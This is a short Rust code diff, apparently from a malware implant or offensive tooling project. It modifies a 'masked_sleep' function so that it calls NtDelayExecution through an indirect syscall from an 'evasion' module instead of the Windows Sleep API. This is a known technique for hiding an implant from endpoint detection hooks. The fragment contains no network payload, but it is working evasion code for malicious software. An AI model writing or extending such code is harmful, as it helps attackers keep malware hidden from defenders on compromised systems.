@@ -82,7 +82,13 @@ pub unsafe fn masked_sleep(duration_ms: u32) {
         WT_EXECUTEINTIMERTHREAD,
     );
 
-    windows_sys::Win32::System::Threading::Sleep(duration_ms + 100);
+    let delay_100ns: i64 = -((duration_ms as i64 + 100) * 10_000);
+    if let Some((ssn_delay, tramp_delay)) = get_ssn(b"NtDelayExecution") {
+        crate::evasion::syscalls::indirect_syscall(
+            ssn_delay, tramp_delay,
+            0, &delay_100ns as *const i64 as usize, 0, 0, 0, 0,
+        );
+    }
     DeleteTimerQueueEx(timer_queue, windows_sys::Win32::Foundation::INVALID_HANDLE_VALUE);
 }
 
